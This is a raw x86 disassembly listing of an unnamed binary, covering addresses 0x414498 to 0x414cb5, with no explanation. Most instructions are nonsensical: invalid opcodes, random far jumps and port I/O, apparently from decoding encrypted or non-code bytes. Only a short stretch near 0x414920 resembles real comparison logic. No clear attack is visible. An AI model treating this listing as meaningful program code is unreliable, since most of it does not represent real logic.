  414498:	stc    
  414499:	mov    cl,BYTE PTR [ebp-0x511bfc2]
  41449f:	loop   0x4144c9
  4144a1:	sbb    BYTE PTR [edx],ah
  4144a3:	jno    0x41444c
  4144a5:	mov    eax,ds:0xd7d58b7b
  4144aa:	mov    esi,0x62a6cbaf
  4144af:	stc    
  4144b0:	frstor [edi*1-0x6b2769d4]
  4144b7:	pop    ds
  4144b8:	lds    ebx,FWORD PTR [ecx+0x16]
  4144bb:	pop    ss
  4144bc:	xchg   edx,eax
  4144bd:	into   
  4144be:	jecxz  0x414534
  4144c0:	out    dx,al
  4144c1:	ror    DWORD PTR [ebp-0x1e],cl
  4144c4:	int3   
  4144c5:	push   ds
  4144c6:	pop    ebx
  4144c7:	inc    ebx
  4144c8:	jno    0x4144ef
  4144ca:	cmp    BYTE PTR [ebx-0x7be4d55d],ah
  4144d0:	jno    0x4144ed
  4144d2:	push   ss
  4144d3:	pop    ebx
  4144d4:	out    0xea,eax
  4144d6:	into   
  4144d7:	add    eax,DWORD PTR [ecx-0x164ad25a]
  4144dd:	sar    bl,1
  4144df:	not    ah
  4144e1:	jmp    0xeeff:0xae9fea17
  4144e8:	enter  0xc400,0xd5
  4144ec:	aam    0x5d
  4144ee:	into   
  4144ef:	(bad)  
  4144f0:	shr    dh,1
  4144f2:	test   al,0x1f
  4144f4:	add    ebp,DWORD PTR [edx+0x2924de2c]
  4144fa:	xor    eax,0x245145bf
  4144ff:	add    eax,DWORD PTR [eax]
  414501:	ins    DWORD PTR es:[edi],dx
  414502:	mov    bh,ch
  414504:	aas    
  414505:	jno    0x4144a7
  414507:	pushf  
  414508:	les    ecx,FWORD PTR [edi-0x2d]
  41450b:	sub    eax,DWORD PTR [edx+0x60]
  41450e:	jmp    DWORD PTR [edi+ebp*2]
  414511:	into   
  414512:	ds pop esp
  414514:	pushf  
  414515:	mov    bl,0xde
  414517:	pushf  
  414518:	xchg   edx,eax
  414519:	aas    
  41451a:	mov    dh,0x89
  41451c:	sbb    BYTE PTR [edx],0x1e
  41451f:	aaa    
  414520:	cmp    eax,0x1e2ff16c
  414525:	not    BYTE PTR [eax-0x2069569e]
  41452b:	js     0x414500
  41452d:	sbb    DWORD PTR [edi],0x62
  414530:	xor    BYTE PTR [edi+0x30],0x5a
  414534:	jg     0x41456b
  414536:	push   ebx
  414537:	inc    esp
  414538:	hlt    
  414539:	je     0x4144dd
  41453b:	ins    DWORD PTR es:[edi],dx
  41453c:	ins    DWORD PTR es:[edi],dx
  41453d:	sar    BYTE PTR [ebx],1
  41453f:	push   esi
  414540:	iret   
  414541:	sti    
  414542:	int3   
  414543:	and    DWORD PTR [edx+0x387a4052],esp
  414549:	stos   BYTE PTR es:[edi],al
  41454a:	nop
  41454b:	inc    esp
  41454c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41454d:	push   0xffffffbe
  41454f:	jo     0x414569
  414551:	mov    edx,0xae7675f1
  414556:	(bad)  
  414557:	scas   eax,DWORD PTR es:[edi]
  414558:	xlat   BYTE PTR ds:[ebx]
  414559:	inc    eax
  41455a:	mov    ds:0x62dd2938,eax
  41455f:	push   ecx
  414560:	rol    bh,1
  414562:	repz aam 0xc
  414565:	ret    0x83de
  414568:	popf   
  414569:	cmp    DWORD PTR [bp-0x2533],eax
  41456e:	xchg   ecx,eax
  41456f:	mov    ecx,0x4516d1b8
  414574:	iret   
  414575:	ins    DWORD PTR es:[edi],dx
  414576:	pop    ebp
  414577:	mov    WORD PTR [ecx+0xbd0f3e5],?
  41457d:	xor    BYTE PTR [ecx+0x2083f691],bl
  414583:	jb     0x414514
  414585:	mov    edx,0xf95aa1df
  41458a:	dec    esp
  41458b:	and    bl,cl
  41458d:	in     al,dx
  41458e:	cs jnp 0x4145d9
  414591:	dec    ebp
  414592:	sbb    ecx,DWORD PTR [edx+0x66]
  414595:	leave  
  414596:	retf   0xbd46
  414599:	mov    BYTE PTR [ecx+0x293b6653],al
  41459f:	adc    BYTE PTR [edi+0x49],cl
  4145a2:	(bad)  
  4145a3:	stc    
  4145a4:	lds    ebp,FWORD PTR [edi+eiz*4-0x13]
  4145a8:	jne    0x414585
  4145aa:	pop    es
  4145ab:	jmp    0x4145bd
  4145ad:	push   ebx
  4145ae:	retf   
  4145af:	and    al,BYTE PTR [edx+ecx*8-0x6b193f9]
  4145b6:	pop    ebx
  4145b7:	idiv   ecx
  4145b9:	ins    DWORD PTR es:[edi],dx
  4145ba:	jnp    0x4145c7
  4145bc:	and    eax,0x302979ab
  4145c1:	(bad)  
  4145c3:	int3   
  4145c4:	jno    0x45399272
  4145ca:	mov    dh,bl
  4145cc:	lock aad 0x5e
  4145cf:	lahf   
  4145d0:	or     cl,BYTE PTR [ecx]
  4145d2:	(bad)  
  4145d3:	mov    WORD PTR [ebp+0x5be30fa2],ds
  4145d9:	out    dx,eax
  4145da:	mov    edx,0x579325db
  4145df:	cmp    bl,0x41
  4145e2:	sbb    eax,0x6fd9f8e8
  4145e7:	pop    eax
  4145e8:	jp     0x4145bb
  4145ea:	mov    ch,0x9e
  4145ec:	iret   
  4145ed:	popa   
  4145ee:	mov    cl,0x1a
  4145f0:	pop    ecx
  4145f1:	js     0x4145ea
  4145f3:	push   edx
  4145f4:	sbb    al,0x5
  4145f6:	mov    ds:0xd3c3ded0,al
  4145fb:	jg     0x414640
  4145fd:	loopne 0x4145fe
  4145ff:	das    
  414600:	lds    edx,FWORD PTR [edx+0x21]
  414603:	jl     0x414657
  414605:	jg     0x414589
  414607:	xor    eax,0x1e82d06e
  41460c:	add    al,0x7
  41460e:	mov    bh,0xd7
  414610:	repnz icebp 
  414612:	mov    bl,0x1f
  414614:	pop    ebx
  414615:	add    eax,0x710c2fef
  41461a:	test   BYTE PTR [edx+0x3b89083f],cl
  414620:	fwait
  414621:	cmp    dh,BYTE PTR ds:0x11489bc9
  414627:	cmp    BYTE PTR [ecx],bh
  414629:	adc    edi,DWORD PTR [ebx+0x57]
  41462c:	dec    edi
  41462d:	into   
  41462e:	mov    ch,0xe0
  414630:	sub    DWORD PTR [ecx],esp
  414632:	loope  0x414659
  414634:	test   ecx,0xef7c9167
  41463a:	sub    edi,eax
  41463c:	push   ebp
  41463d:	mov    ch,0x6e
  41463f:	aad    0x3c
  414641:	aam    0x24
  414643:	call   0xbd5:0x77af033e
  41464a:	cmc    
  41464b:	(bad)  
  41464d:	mov    ebp,0x82c46d3
  414652:	ins    BYTE PTR es:[edi],dx
  414653:	mov    dh,0x24
  414655:	xchg   ebx,eax
  414656:	test   eax,0xa06459e1
  41465b:	adc    eax,0x967b54d
  414660:	inc    ebx
  414661:	test   eax,0xa350dd84
  414666:	(bad)  [edi+esi*1-0x734501b0]
  41466d:	punpckhbw mm1,QWORD PTR [ecx-0x59bc25dd]
  414674:	xchg   ecx,eax
  414675:	in     eax,0xa2
  414677:	jb     0x41466c
  414679:	push   esp
  41467a:	mov    dh,0x6d
  41467c:	(bad)  
  41467d:	mov    bl,0x7b
  41467f:	rcr    DWORD PTR ds:0x3291c4f4,cl
  414685:	stos   DWORD PTR es:[edi],eax
  414686:	fcomi  st,st(2)
  414688:	and    DWORD PTR [eax+0x4c4580db],ecx
  41468e:	ror    DWORD PTR [eax-0xbcfb198],cl
  414694:	pop    ds
  414695:	les    eax,FWORD PTR [esp+edx*1-0x2d9afa5d]
  41469c:	and    esi,DWORD PTR es:[edi-0x640694b]
  4146a3:	(bad)  
  4146a4:	sbb    DWORD PTR [edi+0xa10ca39],esp
  4146aa:	int    0x6a
  4146ac:	arpl   si,cx
  4146ae:	cmp    dl,BYTE PTR [ebp-0x62]
  4146b1:	xchg   ebx,eax
  4146b2:	xlat   BYTE PTR ds:[ebx]
  4146b3:	out    0xcf,eax
  4146b5:	jns    0x414648
  4146b7:	out    0xaa,eax
  4146b9:	adc    al,0x3
  4146bb:	fwait
  4146bc:	or     BYTE PTR [eax+0x3a9f29a2],cl
  4146c2:	xor    bl,BYTE PTR [edx-0x4e]
  4146c5:	out    0x1b,al
  4146c7:	inc    ebx
  4146c8:	(bad)  
  4146c9:	jb     0x4146f7
  4146cb:	je     0x4146dc
  4146cd:	cmp    cl,BYTE PTR [ebx-0x14ceca96]
  4146d3:	ror    esp,0xcf
  4146d6:	add    edx,DWORD PTR [edi-0x294a9a80]
  4146dc:	nop
  4146dd:	(bad)  
  4146de:	sti    
  4146df:	test   al,0x24
  4146e1:	inc    ebp
  4146e2:	add    esi,eax
  4146e4:	call   0x6255633f
  4146e9:	cmp    eax,0x39dbe633
  4146ee:	fcomip st,st(0)
  4146f0:	rcr    bh,1
  4146f2:	(bad)  
  4146f3:	push   ds
  4146f4:	xor    BYTE PTR [ebx+0x18],cl
  4146f7:	pop    edx
  4146f8:	pusha  
  4146f9:	icebp  
  4146fa:	pop    ecx
  4146fb:	dec    ecx
  4146fc:	gs int3 
  4146fe:	xor    DWORD PTR [ecx+0x66],0x4d
  414702:	mov    al,0x8
  414704:	mov    ebx,0xe460c806
  414709:	mov    ch,ch
  41470b:	inc    ecx
  41470c:	xor    DWORD PTR [ebx+0x39],esi
  41470f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414710:	int3   
  414711:	shr    DWORD PTR [edx-0x2dae6880],1
  414717:	and    ch,BYTE PTR [ebp+0x12496d98]
  41471d:	adc    edx,DWORD PTR [ecx+0x5806fc86]
  414723:	cmp    bl,0x9b
  414726:	ror    BYTE PTR [ecx+0x41],1
  414729:	inc    eax
  41472a:	retf   0x3838
  41472d:	ins    DWORD PTR es:[edi],dx
  41472e:	imul   edx,DWORD PTR [edi-0x122c904f],0x1a
  414735:	cwde   
  414736:	mov    edx,0xdb44077d
  41473b:	ins    BYTE PTR es:[edi],dx
  41473c:	sub    DWORD PTR [edx+0x7b2f59a0],edx
  414742:	scas   al,BYTE PTR es:[edi]
  414743:	aaa    
  414744:	push   DWORD PTR [esi]
  414746:	xor    edx,esi
  414748:	add    ah,0xc7
  41474b:	scas   eax,DWORD PTR es:[edi]
  41474c:	in     eax,0xdd
  41474e:	je     0x414796
  414750:	push   ebx
  414751:	in     al,dx
  414752:	pop    edi
  414753:	ss stc 
  414755:	ds repnz retf 
  414758:	test   DWORD PTR [ebx*2+0x2be89b9],eax
  41475f:	cmp    edx,ebp
  414761:	fwait
  414762:	push   edx
  414763:	push   eax
  414764:	in     eax,0x2d
  414766:	out    0x86,eax
  414768:	jp     0x4147c6
  41476a:	xchg   edi,esi
  41476c:	or     al,0x6d
  41476e:	test   BYTE PTR gs:[bx+di-0x779f],0x8d
  414775:	push   0xcac6fff6
  41477a:	push   ds
  41477b:	add    al,0xac
  41477d:	ins    BYTE PTR es:[edi],dx
  41477e:	cli    
  41477f:	(bad)  
  414780:	test   BYTE PTR [eax-0x37b3ec28],0xb7
  414787:	je     0x4147f4
  414789:	fistp  WORD PTR [ebx]
  41478b:	mov    fs,WORD PTR [eax-0x2ece3e5f]
  414791:	and    ecx,ecx
  414793:	jmp    0xd944:0xcda5704e
  41479a:	test   BYTE PTR [ecx-0x5c6e2fe6],0xbf
  4147a1:	mov    edi,DWORD PTR [edx+edi*8]
  4147a4:	pop    ebp
  4147a5:	xchg   edx,eax
  4147a6:	in     eax,dx
  4147a7:	(bad)  
  4147a8:	fwait
  4147a9:	cmp    dh,BYTE PTR [eax-0x44]
  4147ac:	fldl2t 
  4147ae:	mov    eax,ds:0xb841dfec
  4147b3:	dec    ebx
  4147b4:	xor    esp,eax
  4147b6:	xchg   esp,eax
  4147b7:	cmp    BYTE PTR [ecx+0x29],ah
  4147ba:	pop    edi
  4147bb:	sbb    ecx,esi
  4147bd:	push   ebx
  4147be:	xor    eax,0x730d400e
  4147c3:	sub    dh,ch
  4147c5:	outs   dx,DWORD PTR ds:[esi]
  4147c6:	push   cs
  4147c7:	aad    0x7c
  4147c9:	sub    ebp,DWORD PTR [esi]
  4147cb:	retf   
  4147cc:	es jno 0x414796
  4147cf:	lds    esi,FWORD PTR [eax+0x25efb8d6]
  4147d5:	dec    esp
  4147d6:	(bad)  
  4147d7:	sub    ecx,DWORD PTR [edi+eax*4]
  4147da:	xchg   esi,eax
  4147db:	sbb    bh,ah
  4147dd:	outs   dx,BYTE PTR ds:[esi]
  4147de:	dec    ebx
  4147df:	pop    ds
  4147e0:	mov    dh,0xd3
  4147e2:	dec    esp
  4147e3:	mov    esp,0xec412ac5
  4147e8:	hlt    
  4147e9:	ins    BYTE PTR es:[edi],dx
  4147ea:	xor    eax,0x10d843aa
  4147ef:	imul   BYTE PTR [ebp-0x4a]
  4147f2:	clc    
  4147f3:	xchg   DWORD PTR ds:0xa3569738,eax
  4147f9:	in     al,0x5a
  4147fb:	(bad)  
  4147fc:	test   al,0xec
  4147fe:	inc    edi
  4147ff:	not    cl
  414801:	(bad)
  414804:	adc    DWORD PTR [ebx-0x28],edi
  414807:	mov    eax,0xf9223e48
  41480c:	js     0x414874
  41480e:	call   0x6d2a:0x2f26d0f8
  414815:	add    edi,DWORD PTR [eax]
  414817:	fild   WORD PTR [edi-0x68]
  41481a:	stc    
  41481b:	xchg   BYTE PTR [esi+esi*8],ah
  41481e:	dec    ebx
  41481f:	add    esp,edi
  414821:	push   eax
  414822:	fnstenv [ebx+edi*4-0x490c992b]
  414829:	mov    dl,BYTE PTR [ecx]
  41482b:	dec    esi
  41482c:	adc    al,BYTE PTR [ebp-0x4fb531c5]
  414832:	cmp    edx,esp
  414834:	sbb    DWORD PTR [esi+0x1ad68c7],0xfd5f18ef
  41483e:	repz adc eax,0x37d03b74
  414844:	in     eax,dx
  414845:	sbb    eax,ebx
  414847:	cwde   
  414848:	jmp    0x4147f5
  41484a:	sub    DWORD PTR [ecx-0x4e],ebp
  41484d:	mov    edx,0xc29a8c
  414852:	jnp    0x4148a1
  414854:	pop    ds
  414855:	and    BYTE PTR [eax],cl
  414857:	xchg   edi,eax
  414858:	test   al,0xd1
  41485a:	or     ebp,edx
  41485c:	jo     0x414888
  41485e:	inc    esp
  41485f:	ret    
  414860:	jne    0x414807
  414862:	mov    edx,0x98c2f555
  414867:	mov    eax,0x80a39416
  41486c:	or     eax,0x968eb092
  414871:	cmp    DWORD PTR [eax-0x1157c59d],edi
  414877:	add    ah,BYTE PTR [esi-0x33]
  41487a:	sbb    DWORD PTR [esi+0x5d],0x6b
  41487e:	push   ebp
  41487f:	scas   al,BYTE PTR es:[edi]
  414880:	push   esi
  414881:	jne    0x414857
  414883:	xor    al,0x10
  414885:	ret    0x601
  414888:	xor    al,0x3b
  41488a:	addr16 repz sahf 
  41488d:	xor    DWORD PTR [esi+0x47475f81],ebp
  414893:	fwait
  414894:	mov    ds:0x425b542,eax
  414899:	inc    eax
  41489a:	stc    
  41489b:	aam    0xae
  41489d:	retf   
  41489e:	mov    ch,0xc
  4148a0:	leave  
  4148a1:	out    0x7b,eax
  4148a3:	push   0x2cc598cd
  4148a8:	mov    esp,0x4bd761e3
  4148ad:	ja     0x414875
  4148af:	xor    al,0x75
  4148b1:	and    ebx,DWORD PTR [eax-0xea2eaec]
  4148b7:	cwde   
  4148b8:	int    0x13
  4148ba:	pop    edi
  4148bb:	mov    cl,0x3e
  4148bd:	imul   ecx,DWORD PTR [eax+0x26],0x923f7dcd
  4148c4:	xchg   esp,eax
  4148c5:	fnsave ds:0x2fb44b0d
  4148cb:	mov    DWORD PTR [eax],esi
  4148cd:	dec    esi
  4148ce:	push   cs
  4148cf:	add    bh,ch
  4148d1:	mov    bl,0x6e
  4148d3:	(bad)  
  4148d4:	gs mov edx,0x48482029
  4148da:	inc    esp
  4148db:	jmp    0xb692:0x97e17db6
  4148e2:	daa    
  4148e3:	dec    esi
  4148e4:	push   0x3b
  4148e6:	cwde   
  4148e7:	xchg   DWORD PTR [ecx+edx*8+0x3f0e505],eax
  4148ee:	push   cs
  4148ef:	push   ecx
  4148f0:	nop
  4148f1:	fldenv [ebx+eiz*8-0x5b]
  4148f5:	mov    ds:0xc8ae52f8,eax
  4148fa:	cwde   
  4148fb:	push   edi
  4148fc:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148fe:	fs xchg edx,eax
  414901:	(bad)  
  414902:	fdivr  DWORD PTR [edx]
  414904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414905:	mov    al,ds:0x66711e0f
  41490a:	pusha  
  41490b:	nop
  41490c:	jp     0x4148c6
  41490e:	inc    esp
  41490f:	xor    DWORD PTR [ebx-0x6b750bab],ecx
  414915:	adc    eax,0xffffff64
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    bh,BYTE PTR ds:0x4e368663
  414994:	xchg   esp,eax
  414995:	jp     0x414a12
  414997:	mov    cl,0x9c
  414999:	jnp    0x414a16
  41499b:	xor    ebx,DWORD PTR [ebx-0x80]
  41499e:	pop    esi
  41499f:	lods   eax,DWORD PTR ds:[esi]
  4149a0:	inc    ebp
  4149a1:	mov    al,ds:0xb2d769e9
  4149a6:	xchg   esi,eax
  4149a7:	push   ebx
  4149a8:	popf   
  4149a9:	jl     0x4149fc
  4149ab:	mov    dl,0xbe
  4149ad:	dec    esi
  4149ae:	dec    eax
  4149af:	mov    cl,bl
  4149b1:	mov    eax,0x79001f02
  4149b6:	adc    DWORD PTR [ebp-0x5808a51c],esp
  4149bc:	pop    edi
  4149bd:	add    eax,0xfbc13c55
  4149c2:	mov    DWORD PTR [edx+edx*4-0x14708e6d],edi
  4149c9:	push   esp
  4149ca:	push   cs
  4149cb:	lea    ebp,[edi+0x7d]
  4149ce:	bound  ebp,QWORD PTR [edx+0x46]
  4149d1:	in     eax,dx
  4149d2:	sbb    DWORD PTR [esi-0x6ab565f8],edx
  4149d8:	sar    BYTE PTR [ebp+0x45815d81],1
  4149de:	cmc    
  4149df:	(bad)  
  4149e1:	mov    ch,0x14
  4149e3:	arpl   WORD PTR [ecx+0x42994688],di
  4149e9:	fsubr  st(3),st
  4149eb:	xchg   ecx,eax
  4149ec:	fucom  st(0)
  4149ee:	pop    ss
  4149ef:	test   al,0xe
  4149f1:	adc    ebp,DWORD PTR [edx-0x6f]
  4149f4:	or     al,0x51
  4149f6:	cwde   
  4149f7:	iret   
  4149f8:	cmc    
  4149f9:	icebp  
  4149fa:	fstp   DWORD PTR [edi-0x2babd8e1]
  414a00:	adc    al,0x35
  414a02:	jne    0x414a30
  414a04:	push   esp
  414a05:	ret    
  414a06:	into   
  414a07:	pop    edx
  414a08:	sub    BYTE PTR [ebx-0x3b],bl
  414a0b:	fdiv   DWORD PTR [di-0x6ca3]
  414a10:	dec    ebx
  414a11:	ret    
  414a12:	aas    
  414a13:	not    DWORD PTR ds:0x7099ea9c
  414a19:	sbb    al,BYTE PTR [edi+esi*8-0x38]
  414a1d:	aam    0x50
  414a1f:	jbe    0x414a5d
  414a21:	mov    cl,0xac
  414a23:	or     eax,0x2ae0ab87
  414a28:	xor    esi,DWORD PTR [edi+ecx*2+0x7962414b]
  414a2f:	lods   eax,DWORD PTR ds:[esi]
  414a30:	test   eax,edx
  414a32:	xchg   BYTE PTR [ebp-0x429872ac],bh
  414a38:	jge    0x414a12
  414a3a:	or     DWORD PTR [esi-0x59],0xffffffbd
  414a3e:	adc    al,0xdf
  414a40:	das    
  414a41:	leave  
  414a42:	popa   
  414a43:	jo     0x414a35
  414a45:	xlat   BYTE PTR ds:[ebx]
  414a46:	push   ebx
  414a47:	aad    0xda
  414a49:	add    cl,ch
  414a4b:	comiss xmm1,xmm4
  414a4e:	mov    cl,0x9d
  414a50:	push   eax
  414a51:	mov    ecx,0x684dd818
  414a56:	imul   ebp,DWORD PTR ds:0xbd9ac403,0x18b202a3
  414a60:	jmp    0xb441c055
  414a65:	push   eax
  414a66:	sbb    bh,BYTE PTR [edx-0x78f2d1d3]
  414a6c:	jae    0x414ac4
  414a6e:	out    dx,al
  414a6f:	sub    al,0x68
  414a71:	test   al,0x6b
  414a73:	stos   DWORD PTR es:[edi],eax
  414a74:	mov    eax,0x39734422
  414a79:	mov    ch,0x13
  414a7b:	mov    dl,0x5e
  414a7d:	call   0xb861c1c0
  414a82:	fiadd  WORD PTR [ecx*1-0x1e949a37]
  414a89:	inc    eax
  414a8a:	lock ins BYTE PTR es:[edi],dx
  414a8c:	sub    DWORD PTR [eax-0x56a1fe45],0x182aa59
  414a96:	xchg   esi,eax
  414a97:	mov    ebp,0x7e03044f
  414a9c:	jge    0x414a48
  414a9e:	icebp  
  414a9f:	add    dh,BYTE PTR [edi]
  414aa1:	jmp    0x414a49
  414aa3:	cli    
  414aa4:	fiadd  DWORD PTR [ebp+0x6]
  414aa7:	retf   0x23d1
  414aaa:	icebp  
  414aab:	daa    
  414aac:	daa    
  414aad:	shl    esp,0x20
  414ab0:	mov    BYTE PTR [ebx],bl
  414ab2:	cmp    DWORD PTR [ebx+esi*1],ebx
  414ab5:	pusha  
  414ab6:	(bad)  [ebx-0x2cecd8b9]
  414abc:	sub    ah,0xb3
  414abf:	mov    ecx,0xc247bee2
  414ac4:	ins    DWORD PTR es:[edi],dx
  414ac5:	mov    ecx,0x16516393
  414aca:	jmp    0xc2c:0xf0cab99b
  414ad1:	sub    eax,0x198b479f
  414ad6:	xlat   BYTE PTR ds:[ebx]
  414ad7:	mov    ebp,0x8a76c68c
  414adc:	xor    BYTE PTR ss:[edx-0x1e4fbf31],al
  414ae3:	out    dx,eax
  414ae4:	dec    edx
  414ae5:	popa   
  414ae6:	stos   BYTE PTR es:[edi],al
  414ae7:	bound  ecx,QWORD PTR [esi-0x358a7456]
  414aed:	sbb    al,0x3d
  414aef:	cwde   
  414af0:	mov    dh,0xf
  414af2:	hlt    
  414af3:	mov    es,WORD PTR [esi-0x24cd4d0e]
  414af9:	js     0x414af5
  414afb:	test   BYTE PTR [eax+0x3dbea8ec],dh
  414b01:	ficomp WORD PTR [esi-0x80]
  414b04:	shl    DWORD PTR [ecx+0x16],cl
  414b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b08:	add    dl,BYTE PTR [ecx+0xa]
  414b0b:	sti    
  414b0c:	jl     0x414ad5
  414b0e:	ror    BYTE PTR [ecx],0x26
  414b11:	std    
  414b12:	cmp    BYTE PTR [ebx+0x22],cl
  414b15:	xchg   esp,eax
  414b16:	stos   BYTE PTR es:[edi],al
  414b17:	neg    bh
  414b19:	pop    es
  414b1a:	and    eax,0x2ecb10ea
  414b1f:	sub    al,0x45
  414b21:	push   esp
  414b22:	jg     0x414ab1
  414b24:	cmp    eax,0x32361ec8
  414b29:	retf   0xac0
  414b2c:	jp     0x414b3f
  414b2e:	ja     0x414aba
  414b30:	hlt    
  414b31:	mov    ebp,0x8215153b
  414b36:	jl     0x414b5b
  414b38:	and    DWORD PTR ds:0xf8f1569e,0xba7d686e
  414b42:	xor    al,0xe9
  414b44:	or     eax,0xe4dc2f7a
  414b49:	and    al,0x44
  414b4b:	in     al,dx
  414b4c:	popf   
  414b4d:	rcr    bl,0xcb
  414b50:	lahf   
  414b51:	cli    
  414b52:	xlat   BYTE PTR ds:[ebx]
  414b53:	pushf  
  414b54:	inc    edi
  414b55:	or     eax,DWORD PTR [ecx]
  414b57:	lock loope 0x414b67
  414b5a:	or     BYTE PTR [edx],dl
  414b5c:	pop    ss
  414b5d:	dec    ecx
  414b5e:	xor    bl,0xb1
  414b61:	repnz gs pop edx
  414b64:	xchg   esi,eax
  414b65:	aam    0xdd
  414b67:	call   0xe62f:0x57258994
  414b6e:	iret   
  414b6f:	cmp    al,0xf2
  414b71:	mov    bl,0xb2
  414b73:	sbb    dl,dh
  414b75:	mov    dl,0xd7
  414b77:	cld    
  414b78:	out    0x2b,al
  414b7a:	push   edi
  414b7b:	test   eax,0xb8abda80
  414b80:	push   esi
  414b81:	loop   0x414bdb
  414b83:	inc    ebp
  414b84:	int3   
  414b85:	mov    edi,0xe02f7118
  414b8a:	or     BYTE PTR [edi+esi*2],al
  414b8d:	xchg   edi,eax
  414b8e:	mov    edx,0x483ece89
  414b93:	or     DWORD PTR [edx+0x11],edi
  414b96:	push   es
  414b97:	xchg   edi,eax
  414b98:	fbld   TBYTE PTR [edi+edi*8+0x33]
  414b9c:	addr16 xor eax,0x5240b5fa
  414ba2:	pusha  
  414ba3:	sub    edi,esp
  414ba5:	mov    bh,0x54
  414ba7:	ret    0xba8
  414baa:	or     esp,DWORD PTR [edx-0x56]
  414bad:	mov    bh,0xdc
  414baf:	jle    0x414b57
  414bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bb2:	bound  edi,QWORD PTR ds:0x999c7461
  414bb8:	out    dx,eax
  414bb9:	push   0xb48cb955
  414bbe:	push   esp
  414bbf:	gs cmp al,0x72
  414bc2:	jo     0x414c41
  414bc4:	(bad)  
  414bc5:	fistp  DWORD PTR [edx]
  414bc7:	je     0x414b90
  414bc9:	cld    
  414bca:	ret    
  414bcb:	sub    ebx,edx
  414bcd:	and    ah,BYTE PTR [esi]
  414bcf:	repz jmp 0xd704:0x3263da20
  414bd7:	out    dx,eax
  414bd8:	sub    edx,DWORD PTR [eax-0x73]
  414bdb:	fmul   QWORD PTR [esi+0x5a8a6dde]
  414be1:	add    al,0x42
  414be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414be4:	mov    ds:0x8c27c77c,al
  414be9:	daa    
  414bea:	(bad)  
  414bec:	je     0x414be3
  414bee:	xchg   DWORD PTR [ecx-0x590a321a],esi
  414bf4:	jle    0x414b8f
  414bf6:	dec    eax
  414bf7:	cld    
  414bf8:	and    DWORD PTR [eax-0x6de449b],ebx
  414bfe:	into   
  414bff:	xor    al,0x14
  414c01:	and    eax,0xbb2fcca3
  414c06:	call   DWORD PTR [ebx+0x45]
  414c09:	inc    ebx
  414c0a:	push   ss
  414c0b:	out    0x11,al
  414c0d:	inc    esp
  414c0e:	mov    ebx,DWORD PTR [eax-0x4]
  414c11:	xchg   ebp,eax
  414c12:	inc    ecx
  414c13:	pop    ds
  414c14:	pop    esp
  414c15:	sub    bl,dh
  414c17:	pop    ds
  414c18:	mov    bl,0x6a
  414c1a:	(bad)  
  414c1b:	xor    esi,ecx
  414c1d:	adc    ah,BYTE PTR [esp+esi*8+0x7d18ae8d]
  414c24:	gs or  eax,0xa92b2fb8
  414c2a:	sub    al,0xd4
  414c2c:	addr16 push ebx
  414c2e:	mov    ebx,0x2770be07
  414c33:	jmp    0xfe55:0x85feaca4
  414c3a:	ds pop esp
  414c3c:	mov    ebx,DWORD PTR [ecx+edi*4]
  414c3f:	cwde   
  414c40:	stc    
  414c41:	xor    dl,cl
  414c43:	cmp    DWORD PTR [ebp+0x73db1534],ecx
  414c49:	cmp    bh,cl
  414c4b:	hlt    
  414c4c:	das    
  414c4d:	xor    eax,0x6521033
  414c52:	sar    DWORD PTR [eax-0x61327b19],1
  414c58:	jo     0x414cb0
  414c5a:	(bad)  
  414c5b:	lahf   
  414c5c:	pop    ss
  414c5d:	les    ebp,FWORD PTR [ecx+0x2c]
  414c60:	cmp    edx,DWORD PTR [ecx]
  414c62:	mov    cl,0xc4
  414c64:	adc    al,0xa6
  414c66:	(bad)  
  414c67:	lds    eax,FWORD PTR [edi]
  414c69:	test   BYTE PTR [edi-0x47],cl
  414c6c:	add    eax,0x22347f04
  414c71:	ret    0x7196
  414c74:	icebp  
  414c75:	hlt    
  414c76:	pop    esp
  414c77:	xor    eax,0x79b809de
  414c7c:	pusha  
  414c7d:	cli    
  414c7e:	mov    dl,BYTE PTR [ebp+edx*1+0x13]
  414c82:	jecxz  0x414c1f
  414c84:	mov    ecx,0x2be07b7d
  414c89:	mov    bl,dh
  414c8b:	ja     0x414c4c
  414c8d:	enter  0x9160,0x2a
  414c91:	aam    0x47
  414c93:	repnz enter 0x3452,0x68
  414c98:	or     eax,0x5fc4fea0
  414c9d:	push   eax
  414c9e:	cdq    
  414c9f:	cs pop ss
  414ca1:	jnp    0x414c9b
  414ca3:	ins    BYTE PTR es:[edi],dx
  414ca4:	cld    
  414ca5:	cwde   
  414ca6:	(bad)  
  414ca7:	in     eax,dx
  414ca8:	iret   
  414ca9:	xor    eax,esi
  414cab:	mov    ch,0xa7
  414cad:	popa   
  414cae:	add    al,0xfd
  414cb0:	jmp    0x66fd70fb
  414cb5:	arpl   ax,bp
